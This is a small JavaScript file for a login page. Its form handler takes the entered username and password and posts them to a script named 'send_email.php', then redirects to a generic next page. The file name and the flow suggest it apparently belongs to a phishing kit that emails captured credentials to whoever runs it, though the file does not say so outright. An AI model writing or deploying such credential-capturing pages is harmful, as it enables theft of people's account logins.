document.getElementById('ResetPassword').addEventListener('click', function(event) {
    window.location.href = "resetPassword.html";

});

document.getElementById('CreateA').addEventListener('click', function(event) {
    window.location.href = 'create_account.html'; 
});


document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    if (username.trim() && password.trim()) {
        fetch('send_email.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        })
        .then(response => response.json())
        .then(data => {
            alert(data.message); 
            window.location.href = "next_page.html"; 
        })
        .catch(error => {
            alert('Login failed: ' + error.message);
        });
    } else {
        alert('Please enter both username and password.');
    }
});

